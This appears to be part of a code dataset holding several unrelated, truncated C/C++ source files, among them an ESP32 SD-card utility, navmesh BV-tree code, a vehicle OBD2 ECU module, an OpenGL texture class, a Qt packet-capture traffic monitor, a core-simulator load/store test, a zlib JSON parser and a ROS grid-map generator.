\"UNKNOWN\"};\n  sdcard_type_t cardType = SD.cardType();\n  //uint64_t numSectors= SD.numSectors();\n  //uint64_t sectorSize= SD.sectorSize(); \n  uint64_t cardSize  = SD.cardSize() >> 20; // divide by 2^20 = 1'048'576 to get size in MB\n  uint64_t cardTotal = SD.totalBytes() >> 20;\n  uint64_t cardUsed  = SD.usedBytes() >>  20;\n  uint64_t cardFree  = cardTotal - cardUsed; \n  Serial.printf(R\"(\nSDCard Info\n-----------\ntype     %s\nsize   %6llu MB\ntotal  %6llu MB\nused   %6llu MB\nfree   %6llu MB\n)\", knownCardTypes[cardType], cardSize, cardTotal, cardUsed, cardFree);\n  Serial.printf(\"\\n\");  \n}\n\n\n/**\n * Recursively lists all directories/files of \n * the file system starting at direcory dir\n * \n * Usage    listFiles(SD.open(\"/\"));            // show content starting at root\n *          listFiles(SD.open(\"/SCREENSHOTS\"))  // show content of directory SCREENSHOTS\n * \n * Code borrowed from:\n * https://wiki-content.arduino.cc/en/Tutorial/LibraryExamples/Listfiles * \n*/\nvoid listFiles(File dir, int indent=0) \n{\n  while (true) \n  {\n    File entry =  dir.openNextFile();\n\n    if (! entry) break; // no more files\n    \n    Serial.printf(\"%*c\", indent*4, ' ');\n\n    if (entry.isDirectory()) \n    {\n      Serial.printf(\"%s/\\n\", entry.name());\n      listFiles(entry, indent + 1);\n    } \n    else \n    {\n      // files have sizes, directories do not\n      Serial.printf(\"%s, %d\\n\", entry.name(), entry.size());\n    }\n    entry.close();\n  }\n}",
    "//\n// Copyright (c) 2009-2010 Mikko Mononen memon@inside.org\n//\n// This software is provided 'as-is', without any express or implied\n// warranty.  In no event will the authors be held liable for any damages\n// arising from the use of this software.\n// Permission is granted to anyone to use this software for any purpose,\n// including commercial applications, and to alter it and redistribute it\n// freely, subject to the following restrictions:\n// 1. The origin of this software must not be misrepresented; you must not\n//    claim that you wrote the original software. If you use this software\n//    in a product, an acknowledgment in the product documentation would be\n//    appreciated but is not required.\n// 2. Altered source versions must be plainly marked as such, and must not be\n//    misrepresented as being the original software.\n// 3. This notice may not be removed or altered from any source distribution.\n//\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <float.h>\n#include \"DetourNavMesh.h\"\n#include \"DetourCommon.h\"\n#include \"DetourMath.h\"\n#include \"DetourNavMeshBuilder.h\"\n#include \"DetourAlloc.h\"\n#include \"DetourAssert.h\"\n\nstatic unsigned short MESH_NULL_IDX = 0xffff;\n\n\nstruct BVItem\n{\n\tunsigned short bmin[3];\n\tunsigned short bmax[3];\n\tint i;\n};\n\nstatic int compareItemX(const void* va, const void* vb)\n{\n\tconst BVItem* a = (const BVItem*)va;\n\tconst BVItem* b = (const BVItem*)vb;\n\tif (a->bmin[0] < b->bmin[0])\n\t\treturn -1;\n\tif (a->bmin[0] > b->bmin[0])\n\t\treturn 1;\n\treturn 0;\n}\n\nstatic int compareItemY(const void* va, const void* vb)\n{\n\tconst BVItem* a = (const BVItem*)va;\n\tconst BVItem* b = (const BVItem*)vb;\n\tif (a->bmin[1] < b->bmin[1])\n\t\treturn -1;\n\tif (a->bmin[1] > b->bmin[1])\n\t\treturn 1;\n\treturn 0;\n}\n\nstatic int compareItemZ(const void* va, const void* vb)\n{\n\tconst BVItem* a = (const BVItem*)va;\n\tconst BVItem* b = (const BVItem*)vb;\n\tif (a->bmin[2] < b->bmin[2])\n\t\treturn -1;\n\tif (a->bmin[2] > b->bmin[2])\n\t\treturn 1;\n\treturn 0;\n}\n\nstatic void calcExtends(BVItem* items, const int /*nitems*/, const int imin, const int imax,\n\t\t\t\t\t\tunsigned short* bmin, unsigned short* bmax)\n{\n\tbmin[0] = items[imin].bmin[0];\n\tbmin[1] = items[imin].bmin[1];\n\tbmin[2] = items[imin].bmin[2];\n\t\n\tbmax[0] = items[imin].bmax[0];\n\tbmax[1] = items[imin].bmax[1];\n\tbmax[2] = items[imin].bmax[2];\n\t\n\tfor (int i = imin+1; i < imax; ++i)\n\t{\n\t\tconst BVItem& it = items[i];\n\t\tif (it.bmin[0] < bmin[0]) bmin[0] = it.bmin[0];\n\t\tif (it.bmin[1] < bmin[1]) bmin[1] = it.bmin[1];\n\t\tif (it.bmin[2] < bmin[2]) bmin[2] = it.bmin[2];\n\t\t\n\t\tif (it.bmax[0] > bmax[0]) bmax[0] = it.bmax[0];\n\t\tif (it.bmax[1] > bmax[1]) bmax[1] = it.bmax[1];\n\t\tif (it.bmax[2] > bmax[2]) bmax[2] = it.bmax[2];\n\t}\n}\n\ninline int longestAxis(unsigned short x, unsigned short y, unsigned short z)\n{\n\tint\taxis = 0;\n\tunsigned short maxVal = x;\n\tif (y > maxVal)\n\t{\n\t\taxis = 1;\n\t\tmaxVal = y;\n\t}\n\tif (z > maxVal)\n\t{\n\t\taxis = 2;\n\t}\n\treturn axis;\n}\n\nstatic void subdivide(BVItem* items, int nitems, int imin, int imax, int& curNode, dtBVNode* nodes)\n{\n\tint inum = imax - imin;\n\tint icur = curNode;\n\t\n\tdtBVNode& node = nodes[curNode++];\n\t\n\tif (inum == 1)\n\t{\n\t\t// Leaf\n\t\tnode.bmin[0] = items[imin].bmin[0];\n\t\tnode.bmin[1] = items[imin].bmin[1];\n\t\tnode.bmin[2] = items[imin].bmin[2];\n\t\t\n\t\tnode.bmax[0] = items[imin].bmax[0];\n\t\tnode.bmax[1] = items[imin].bmax[1];\n\t\tnode.bmax[2] = items[imin].bmax[2];\n\t\t\n\t\tnode.i = items[imin].i;\n\t}\n\telse\n\t{\n\t\t// Split\n\t\tcalcExtends(items, nitems, imin, imax, node.bmin, node.bmax);\n\t\t\n\t\tint\taxis = longestAxis(node.bmax[0] - node.bmin[0],\n\t\t\t\t\t\t\t   node.bmax[1] - node.bmin[1],\n\t\t\t\t\t\t\t   node.bmax[2] - node.bmin[2]);\n\t\t\n\t\tif (axis == 0)\n\t\t{\n\t\t\t// Sort along x-axis\n\t\t\tqsort(items+imin, inum, sizeof(BVItem), compareItemX);\n\t\t}\n\t\telse if (axis == 1)\n\t\t{\n\t\t\t// Sort along y-axis\n\t\t\tqsort(items+imin, inum, sizeof(BVItem), compareItemY);\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// Sort along z-axis\n\t\t\tqsort(items+imin, inum, sizeof(BVItem), compareItemZ);\n\t\t}\n\t\t\n\t\tint isplit = imin+inum/2;\n\t\t\n\t\t// Left\n\t\tsubdivide(items, nitems, imin, isplit, curNode, nodes);\n\t\t// Right\n\t\tsubdivide(items, nitems, isplit, imax, curNode, nodes);\n\t\t\n\t\tint iescape = curNode - icur;\n\t\t// Negative index means escape.\n\t\tnode.i = -iescape;\n\t}\n}\n\nstatic int createBVTree(dtNavMeshCreateParams* params, dtBVNode* nodes, int /*nnodes*/)\n{\n\t// Build tree\n\tfloat quantFactor = 1 / params->cs;\n\tBVItem* items = (BVItem*)dtAlloc(sizeof(BVItem)*params->polyCount, DT_ALLOC_TEMP);\n\tfor (int i = 0; i < params->polyCount; i++)\n\t{\n\t\tBVItem& it = items[i];\n\t\tit.i = i;\n\t\t// Calc polygon bounds. Use detail meshes if available.\n\t\tif (params->detailMeshes)\n\t\t{\n\t\t\tint vb = (int)params->detailMeshes[i*4+0];\n\t\t\tint ndv = (int)params->detailMeshes[i*4+1];\n\t\t\tfloat bmin[3];\n\t\t\tfloat bmax[3];\n\n\t\t\tconst float* dv = &params->detailVerts[vb*3];\n\t\t\tdtVcopy(bmin, dv);\n\t\t\tdtVcopy(bmax, dv);\n\n\t\t\tfor (int j = 1; j < ndv; j++)\n\t\t\t{\n\t\t\t\tdtVmin(bmin, &dv[j * 3]);\n\t\t\t\tdtVmax(bmax, &dv[j * 3]);\n\t\t\t}\n\n\t\t\t// BV-tree uses cs for all dimensions\n\t\t\tit.bmin",
    "/*\n;    Project:       Open Vehicle Monitor System\n;    Date:          14th March 2017\n;\n;    Changes:\n;    1.0  Initial release\n;\n;    (C) 2011       Michael Stegen / Stegen Electronics\n;    (C) 2011-2017  Mark Webb-Johnson\n;    (C) 2011        Sonny Chen @ EPRO/DX\n;    (C) 2017       Gregory Dolkas\n;\n; Permission is hereby granted, free of charge, to any person obtaining a copy\n; of this software and associated documentation files (the \"Software\"), to deal\n; in the Software without restriction, including without limitation the rights\n; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n; copies of the Software, and to permit persons to whom the Software is\n; furnished to do so, subject to the following conditions:\n;\n; The above copyright notice and this permission notice shall be included in\n; all copies or substantial portions of the Software.\n;\n; THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n; THE SOFTWARE.\n*/\n\n#include \"ovms_log.h\"\nstatic const char *TAG = \"obd2ecu\";\n\n#include <string.h>\n#include <dirent.h>\n#include \"obd2ecu.h\"\n#include \"ovms_script.h\"\n#include \"ovms_config.h\"\n#include \"ovms_command.h\"\n#include \"ovms_peripherals.h\"\n#include \"metrics_standard.h\"\n\n\nobd2pid::obd2pid(int pid, pid_t type, OvmsMetric* metric)\n  {\n  m_pid = pid;\n  m_type = type;\n  m_script = NULL;\n  m_metric = metric;\n  }\n\nobd2pid::~obd2pid()\n  {\n  if (m_script)\n    {\n    free(m_script);\n    m_script = NULL;\n    }\n  }\n\nint obd2pid::GetPid()\n  {\n  return m_pid;\n  }\n\nobd2pid::pid_t obd2pid::GetType()\n  {\n  return m_type;\n  }\n\nconst char* obd2pid::GetTypeString()\n  {\n  switch (m_type)\n    {\n    case Unimplemented:  return \"unimplemented\";\n    case Internal:       return \"internal\";\n    case Metric:         return \"metric\";\n    case Script:         return \"script\";\n    default:             return \"unknown\";\n    }\n  }\n\nOvmsMetric* obd2pid::GetMetric()\n  {\n  return m_metric;\n  }\n\nvoid obd2pid::SetType(pid_t type)\n  {\n  m_type = type;\n  }\n\nvoid obd2pid::SetMetric(OvmsMetric* metric)\n  {\n  m_metric = metric;\n  }\n\nvoid obd2pid::LoadScript(std::string path)\n  {\n  FILE* f = fopen(path.c_str(), \"r\");\n  if (f == NULL) return;\n\n  fseek(f, 0L, SEEK_END);\n  size_t fsz = ftell(f);\n  fseek(f, 0L, SEEK_SET);\n\n  if (m_script)\n    {\n    free(m_script);\n    m_script = NULL;\n    }\n  m_script = (char*)ExternalRamMalloc(fsz+1);\n  fread(m_script, 1, fsz, f);\n  m_script[fsz] = 0;\n\n  fclose(f);\n  }\n\nfloat obd2pid::Execute()\n  {\n  switch (m_type)\n    {\n    case Unimplemented:   // PIDs requested by device but not already known\n      return 0;\n    case Internal:        // Pre-configured PIDs\n    case Metric:          // PIDs defined or redefined by Config command\n      if (m_metric)\n        return m_metric->AsFloat();\n      else\n        return 0.0;\n    case Script:\n#ifdef CONFIG_OVMS_SC_JAVASCRIPT_DUKTAPE\n      {\n      return MyDuktape.DuktapeEvalFloatResult(m_script);\n      }\n#else // #ifdef CONFIG_OVMS_SC_JAVASCRIPT_DUKTAPE\n      return 0;\n#endif // #ifdef CONFIG_OVMS_SC_JAVASCRIPT_DUKTAPE\n    default:\n      return 0;\n    }\n  }\n\n\nstatic void OBD2ECU_task(void *pvParameters)\n  {\n  obd2ecu *me = (obd2ecu*)pvParameters;\n\n  CAN_frame_t frame;\n  while(1)\n    {\n    if (xQueueReceive(me->m_rxqueue, &frame, (portTickType)portMAX_DELAY)==pdTRUE)\n      {\n      // Only handle incoming frames on our CAN bus\n      if (frame.origin == me->m_can) me->IncomingFrame(&frame);\n      }\n    }\n  }\n\nobd2ecu::obd2ecu(const char* name, canbus* can)\n  : pcp(name)\n  {\n  m_can = can;\n  m_can->Start(CAN_MODE_ACTIVE,CAN_SPEED_500KBPS);\n  m_can->SetPowerMode(On);\n\n  m_rxqueue = xQueueCreate(20,sizeof(CAN_frame_t));\n\n  m_starttime = time(NULL);\n  LoadMap();\n\n  xTaskCreatePinnedToCore(OBD2ECU_task, \"OVMS OBDII ECU\", 6144, (void*)this, 5, &m_task, CORE(1));\n\n  MyCan.RegisterListener(m_rxqueue);\n  NotifyStartup();\n  }\n\nobd2ecu::~obd2ecu()\n  {\n  NotifyShutdown();\n  m_can->SetPowerMode(Off);\n  MyCan.DeregisterListener(m_rxqueue);\n\n  vQueueDelete(m_rxqueue);\n  vTaskDelete(m_task);\n\n  ClearMap();\n  }\n\nvoid obd2ecu::NotifyStartup()\n  {\n  StandardMetrics.ms_m_obd2ecu_on->SetValue(true);\n  MyEvents.SignalEvent(\"obd2ecu.start\", NULL);\n  }\n\nvoid obd2ecu::NotifyShutdown()\n  {\n  StandardMetrics.ms_m_obd2ecu_on->SetValue(false);\n  MyEvents.SignalEvent(\"obd2ecu.stop\", NULL);\n  }\n\nvoid obd2ecu::SetPowerMode(PowerMode powermode)\n  {\n  m_powermode = powermode;\n  switch (powermode)\n    {\n    case On:\n      break;\n    case Sleep:\n      break;\n    case DeepSleep:\n      break;\n    case Off:\n      break;\n    default:\n      break;\n    }\n  }\n\nvoid obd2ecu_start(int verbosity, OvmsWrit",
    "#include \"../Header/texture.h\"\n#include \"../Header/stb_image.h\"\n#include <iostream>\n\nTexture* Texture::m_lastBind = 0;\n\nTexture::Texture(const std::string& fileName, GLenum textureTarget, GLfloat filter)\n{\n  int x, y, numComponents;\n  unsigned char* data = stbi_load((std::string(RESOURCE_PATH) + \"/texture/\" + fileName).c_str(), &x,\n                                  &y, &numComponents, 4);\n  if (data == NULL)\n  {\n    std::cerr << \"Unable to load texture: \" << fileName << std::endl;\n  }\n  initTexture(x, y, data, textureTarget, filter);\n\n  stbi_image_free(data);\n}\n\nTexture::Texture(int width, int height, unsigned char* data, GLenum textureTarget, GLfloat filter)\n{\n  initTexture(width, height, data, textureTarget, filter);\n}\n\nvoid Texture::initTexture(int width, int height, unsigned char* data, GLenum textureTarget,\n                          GLfloat filter)\n{\n  m_textureTarget = textureTarget;\n  m_freeTexture = true;\n\n  if (width > 0 && height > 0 && data != 0)\n  {\n    glGenTextures(1, &m_textureID);\n    glBindTexture(textureTarget, m_textureID);\n    glTexParameterf(textureTarget, GL_TEXTURE_MIN_FILTER, filter);\n    glTexParameterf(textureTarget, GL_TEXTURE_MAG_FILTER, filter);\n    glTexParameterf(textureTarget, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameterf(textureTarget, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexImage2D(textureTarget, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, data);\n  }\n  else\n  {\n    m_textureID = 0;\n  }\n}\n\nTexture::~Texture()\n{\n  if (m_freeTexture)\n    glDeleteTextures(1, &m_textureID);\n}\n\nTexture::Texture(Texture& texture)\n{\n  m_textureTarget = texture.m_textureTarget;\n  m_textureID = texture.m_textureID;\n  m_freeTexture = true;\n  texture.m_freeTexture = false;\n}\n\nTexture& Texture::operator=(Texture&& other)\n{\n  m_textureTarget = other.m_textureTarget;\n  m_textureID = other.m_textureID;\n  m_freeTexture = true;\n  other.m_freeTexture = false;\n\n  return *this;\n}\n\nvoid Texture::operator=(Texture& texture)\n{\n  m_textureTarget = texture.m_textureTarget;\n  m_textureID = texture.m_textureID;\n  m_freeTexture = true;\n  texture.m_freeTexture = false;\n}\n\nvoid Texture::bind(GLenum textureUnit)\n{\n  if (m_lastBind != this)\n  {\n    glActiveTexture(textureUnit);\n    glBindTexture(m_textureTarget, m_textureID);\n    m_lastBind = this;\n  }\n}\n\nGLuint Texture::getID()\n{\n  return m_textureID;\n}\n",
    "#include \"networkmonitor.h\"\n#include <QHeaderView>\n#include <QDateTime>\n#include <QProcess>\n#include <QRegularExpression>\n#include <QFileDialog>\n#include <QTextStream>\n#include <QTimer>\n#include <QMessageBox>\n#include <stdexcept>\n\nNetworkMonitor::NetworkMonitor(QWidget *parent)\n    : QMainWindow(parent)\n    , handle(nullptr)\n    , showTcp(true)\n    , showUdp(true)\n    , settings(QApplication::organizationName(), QApplication::applicationName())\n{\n    setupUI();\n    startCapture();\n    connect(this, &NetworkMonitor::packetReceived, this, &NetworkMonitor::updateDisplay);\n}\n\nNetworkMonitor::~NetworkMonitor()\n{\n    saveSettings();\n    if (handle) {\n        pcap_close(handle);\n    }\n}\n\nvoid NetworkMonitor::setupUI()\n{\n    QWidget *centralWidget = new QWidget(this);\n    setCentralWidget(centralWidget);\n    \n    // \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c, \u0442\u0435\u043c\u043d\u0430\u044f \u043b\u0438 \u0442\u0435\u043c\u0430, \u043f\u043e \u0446\u0432\u0435\u0442\u0443 \u0444\u043e\u043d\u0430\n    bool isDarkTheme = qApp->palette().color(QPalette::Window).value() < 128;\n    \n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0441\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430 \u0434\u043e \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0441\u0442\u0438\u043b\u0435\u0439\n    QVBoxLayout *mainLayout = new QVBoxLayout(centralWidget);\n    QHBoxLayout *filterLayout = new QHBoxLayout();\n    \n    tcpCheckBox = new QCheckBox(\"TCP\", this);\n    udpCheckBox = new QCheckBox(\"UDP\", this);\n    tcpCheckBox->setChecked(true);\n    udpCheckBox->setChecked(true);\n    \n    ipFilterEdit = new QLineEdit(this);\n    ipFilterEdit->setPlaceholderText(\"\u0424\u0438\u043b\u044c\u0442\u0440 \u043f\u043e IP\");\n    \n    portFilterEdit = new QLineEdit(this);\n    portFilterEdit->setPlaceholderText(\"\u0424\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u043f\u043e\u0440\u0442\u0430\u043c\");\n    \n    processFilterEdit = new QLineEdit(this);\n    processFilterEdit->setPlaceholderText(\"\u0424\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0443\");\n    \n    trafficTable = new QTableWidget(this);\n    trafficTable->setColumnCount(7);\n    trafficTable->setHorizontalHeaderLabels({\n        \"\u0412\u0440\u0435\u043c\u044f\", \"\u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b\", \"\u0418\u0441\u0442\u043e\u0447\u043d\u0438\u043a\", \"\u041d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\", \n        \"\u041f\u0440\u043e\u0446\u0435\u0441\u0441\", \"\u0420\u0430\u0437\u043c\u0435\u0440\", \"\u041f\u043e\u0440\u0442\u044b\"\n    });\n    trafficTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);\n    \n    // \u0422\u0435\u043f\u0435\u0440\u044c \u043f\u0440\u0438\u043c\u0435\u043d\u044f\u0435\u043c \u0441\u0442\u0438\u043b\u0438\n    if (isDarkTheme) {\n        // \u0426\u0432\u0435\u0442\u0430 \u0434\u043b\u044f \u0442\u0435\u043c\u043d\u043e\u0439 \u0442\u0435\u043c\u044b\n        tcpColor = QColor(42, 86, 128);\n        udpColor = QColor(128, 86, 42);\n        \n        QString tableStyle = \n            \"QTableWidget { gridline-color: #353535; }\"\n            \"QHeaderView::section { background-color: #353535; color: white; padding: 4px; border: none; }\"\n            \"QTableWidget::item { padding: 4px; }\";\n            \n        QString controlStyle = \n            \"QCheckBox { color: white; }\"\n            \"QCheckBox::indicator { width: 16px; height: 16px; }\"\n            \"QCheckBox::indicator:unchecked { background-color: #252525; border: 1px solid #555; }\"\n            \"QCheckBox::indicator:checked { background-color: #2A82DA; border: 1px solid #2A82DA; }\"\n            \"QPushButton { background-color: #2A82DA; color: white; border: none; padding: 5px 15px; }\"\n            \"QPushButton:hover { background-color: #3292EA; }\"\n            \"QLineEdit { background-color: #252525; color: white; border: 1px solid #555; padding: 3px; }\"\n            \"QLabel { color: white; }\";\n            \n        trafficTable->setStyleSheet(tableStyle);\n        centralWidget->setStyleSheet(controlStyle);\n    } else {\n        // \u0426\u0432\u0435\u0442\u0430 \u0434\u043b\u044f \u0441\u0432\u0435\u0442\u043b\u043e\u0439 \u0442\u0435\u043c\u044b\n        tcpColor = QColor(225, 240, 255);\n        udpColor = QColor(255, 240, 225);\n        \n        QString tableStyle = \n            \"QTableWidget { gridline-color: #d0d0d0; }\"\n            \"QHeaderView::section { background-color: #f0f0f0; color: black; padding: 4px; border: none; }\"\n            \"QTableWidget::item { padding: 4px; }\";\n            \n        QString controlStyle = \n            \"QCheckBox { color: black; }\"\n            \"QCheckBox::indicator { width: 16px; height: 16px; }\"\n            \"QCheckBox::indicator:unchecked { background-color: white; border: 1px solid #aaa; }\"\n            \"QCheckBox::indicator:checked { background-color: #0078d4; border: 1px solid #0078d4; }\"\n            \"QPushButton { background-color: #0078d4; color: white; border: none; padding: 5px 15px; }\"\n            \"QPushButton:hover { background-color: #1988d4; }\"\n            \"QLineEdit { background-color: white; color: black; border: 1px solid #aaa; padding: 3px; }\"\n            \"QLabel { color: black; }\";\n            \n        trafficTable->setStyleSheet(tableStyle);\n        centralWidget->setStyleSheet(controlStyle);\n    }\n    \n    // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0432\u0438\u0434\u0436\u0435\u0442\u044b \u0432 layout\n    filterLayout->addWidget(tcpCheckBox);\n    filterLayout->addWidget(udpCheckBox);\n    filterLayout->addWidget(new QLabel(\"IP:\", this));\n    filterLayout->addWidget(ipFilterEdit);\n    filterLayout->addWidget(new QLabel(\"\u041f\u043e\u0440\u0442:\", this));\n    filterLayout->addWidget(portFilterEdit);\n    filterLayout->addWidget(new QLabel(\"\u041f\u0440\u043e\u0446\u0435\u0441\u0441:\", this));\n    filterLayout->addWidget(processFilterEdit);\n    \n    QPushButton *exportButton = new QPushButton(\"\u042d\u043a\u0441\u043f\u043e\u0440\u0442 \u0432 CSV\", this);\n    filterLayout->addWidget(exportButton);\n    filterLayout->addStretch();\n    \n    mainLayout->addLayout(filterLayout);\n    mainLayout->addWidget(trafficTable);\n    \n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u0441\u0438\u0433",
    "\n#include \"Gold_core.hpp\"\n\nuint8_t get_byte(uint64_t addr) { return addr >> 4; }\n\nint main() {\n    Gold_mem mem(get_byte);\n\n    Gold_core core(mem, 0);\n\n    auto oldest_ld = core.inorder();\n\n    core.set_type(oldest_ld, Mem_op::Load);\n\n    auto &oldest_ld_data = core.ld_data_ref(oldest_ld);\n    oldest_ld_data.add_addr(0x135);\n\n    auto oldest_st = core.inorder();\n\n    core.set_type(oldest_st, Mem_op::Load);\n\n    auto bad_spec_ld = core.inorder();\n\n    core.ld_perform(oldest_ld);\n    assert(oldest_ld_data.get_byte(0x135) == 0x13);\n\n    auto &bad_spec_data = core.ld_data_ref(bad_spec_ld);\n    bad_spec_data.add_addr(0x134, 3);\n    core.ld_perform(bad_spec_ld);\n    assert(bad_spec_data.get_byte(0x134) == 0x13);\n    assert(bad_spec_data.get_byte(0x135) == 0x13);\n    assert(bad_spec_data.get_byte(0x136) == 0x13);\n\n    core.dump();\n\n    core.set_safe(oldest_st);\n    auto &oldest_st_data = core.st_data_ref(oldest_st);\n    oldest_st_data.add_addr(0x135, 2);\n    oldest_st_data.set_byte(0x135, 0x55);\n    oldest_st_data.set_byte(0x136, 0x66);\n\n    core.st_locally_perform(oldest_st);\n\n    assert(core.has_error(bad_spec_ld));\n\n    assert(oldest_ld_data.get_byte(0x135) == 0x13);\n\n    core.dump();\n\n    core.ld_perform(bad_spec_ld);  // re-exec load\n    core.dump();\n    assert(bad_spec_data.get_byte(0x134) == 0x13);\n    assert(bad_spec_data.get_byte(0x135) == 0x55);\n    assert(bad_spec_data.get_byte(0x136) == 0x66);\n    assert(!core.has_error(bad_spec_ld));\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <zlib.h>\n#include <nlohmann/json.hpp> \n// add comment\n// add new comment\nusing json = nlohmann::json;\n\nstd::string DecompressFile(const std::string& filename) {\n    gzFile file = gzopen(filename.c_str(), \"rb\");\n    if (!file) {\n        std::cerr << \"Failed to open the compressed file.\\n\";\n        return \"\";\n    }\n\n    std::string decompressed_data;\n    char buffer;\n\n    while (gzread(file, &buffer, 1) > 0) {\n        decompressed_data.push_back(buffer);\n    }\n\n    if (gzeof(file) == 0) {\n        std::cerr << \"Error while reading the compressed file.\\n\";\n    }\n\n    gzclose(file);\n    return decompressed_data;\n}\n\nbool CompressFile(const std::string& input_string, const std::string& output_filename) {\n    gzFile output_file = gzopen(output_filename.c_str(), \"wb\");\n    if (!output_file) {\n        std::cerr << \"Failed to create the compressed file.\\n\";\n        return false;\n    }\n\n    if (gzwrite(output_file, input_string.data(), input_string.size()) == 0) {\n        std::cerr << \"Failed to write to the compressed file.\\n\";\n        gzclose(output_file);\n        return false;\n    }\n\n    gzclose(output_file);\n    return true;\n}\n\nvoid ParseJSON(const std::string& json_data) {\n    try {\n        json parsed_data = json::parse(json_data);\n\n        for (const auto& commit : parsed_data) {\n            std::cout << \"Commit ID: \" << commit[\"commit_id\"] << \"\\n\";\n            std::cout << \"Message: \" << commit[\"commit\"] << \"\\n\";\n            std::cout << \"Branch: \" << commit[\"branch\"] << \"\\n\";\n            std::cout << \"Timestamp: \" << commit[\"timestamp\"] << \"\\n\";\n            std::cout << \"Parent Commit: \" << commit[\"parent_commit\"] << \"\\n\";\n\n            for (const auto& file : commit[\"file\"]) {\n                std::cout << \"File Path: \" << file[0] \n                          << \", Hash1: \" << file[1] \n                          << \", Hash2: \" << file[2]\n                          << \", Extra Info: \" << file[3] << \"\\n\";\n            }\n            for (const auto& file : commit[\"file\"]) {\n                std::cout << \"File Path: \" << file[0] << \", Hash1: \" << file[1] \n                        << \", Hash2: \" << file[2];\n                for (size_t i = 3; i < file.size(); ++i) {\n                    std::cout << \", Extra Info \" << i - 2 << \": \" << file[i];\n                }\n                std::cout << \"\\n\";\n            }\n            std::cout << \"-----------------------------\\n\";\n        }\n    } catch (const std::exception& e) {\n        std::cerr << \"Error parsing JSON: \" << e.what() << \"\\n\";\n    }\n}\n\nint main() {\n    const std::string original_file = \"compressed.txt\";\n    const std::string compressed_file = \"compressed.json.gz\";\n\n    // \u0642\u0631\u0627\u0621\u0629 \u0645\u062d\u062a\u0648\u0649 \u0645\u0644\u0641 JSON \u0627\u0644\u0623\u0635\u0644\u064a\n    std::ifstream infile(original_file);\n    if (!infile.is_open()) {\n        std::cerr << \"Failed to open the original JSON file.\\n\";\n        return 1;\n    }\n\n    std::stringstream buffer;\n    buffer << infile.rdbuf();\n    infile.close();\n    std::string json_data = buffer.str();\n\n    // \u0636\u063a\u0637 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a\n    if (!CompressFile(json_data, compressed_file)) {\n        return 1;\n    }\n\n    // \u0641\u0643 \u0636\u063a\u0637 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a\n    std::string decompressed_data = DecompressFile(compressed_file);\n    if (decompressed_data.empty()) {\n        return 1;\n    }\n\n    // \u062a\u062d\u0644\u064a\u0644 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a\n    ParseJSON(decompressed_data);\n\n    return 0;\n}\n",
    "#include \"grid_map.h\"\n\nusing namespace grid_map;\n\nGridMapGenerator::GridMapGenerator(\n    const ros::NodeHandle &nh,\n    std::shared_ptr<grid_map::GridMap> global_map_ptr,\n    std::vector<std::string> layers)\n    : nh_(nh), m_grid_map_ptr(global_map_ptr), m_layers(layers) {\n\n  // \u521d\u59cb\u5316 GridMap\n  m_grid_map = *m_grid_map_ptr;\n\n  m_grid_map.setFrameId(\"world\");\n  m_grid_map.setGeometry(\n      grid_map::Length(m_length, m_width), m_resolution,\n      grid_map::Position(m_map_start_pos_x, m_map_start_pos_y));\n\n  generateGridMap();\n  random_generate_obs(20, std::min(m_length, m_width) / 25,\n                      std::max(m_length, m_width) / 10);\n  // \u53d1\u5e03 GridMap\n  m_map_publisher = nh_.advertise<grid_map_msgs::GridMap>(\"grid_map\", 1);\n  m_map_publish_timer =\n      nh_.createTimer(ros::Duration(0.033),\n                      boost::bind(&GridMapGenerator::mapPubTimerCB, this, _1));\n  m_map_publish_timer.start();\n  m_dynamic_object_timer = nh_.createTimer(\n      ros::Duration(0.02),\n      boost::bind(&GridMapGenerator::generate_dynamic_object, this, _1));\n  m_dynamic_object_timer.start();\n}\n\nbool GridMapGenerator::isPointInPolygon(double x, double y) {\n  for (auto polygon : m_polygons) {\n    int n = polygon.points.size();\n    bool inside = false;\n    double p1x = polygon.points[0].x, p1y = polygon.points[0].y;\n    for (int i = 1; i <= n; ++i) {\n      double p2x = polygon.points[i % n].x, p2y = polygon.points[i % n].y;\n      if (y > std::min(p1y, p2y)) {\n        if (y <= std::max(p1y, p2y)) {\n          if (x <= std::max(p1x, p2x)) {\n            if (p1y != p2y) {\n              double xinters = (y - p1y) * (p2x - p1x) / (p2y - p1y) + p1x;\n              if (p1x == p2x || x <= xinters)\n                inside = !inside;\n            }\n          }\n        }\n      }\n      p1x = p2x;\n      p1y = p2y;\n    }\n    if (inside) {\n      return true;\n    }\n  }\n  return false;\n}\n\nvoid GridMapGenerator::random_generate_obs(int circle_num, double radius_min,\n                                          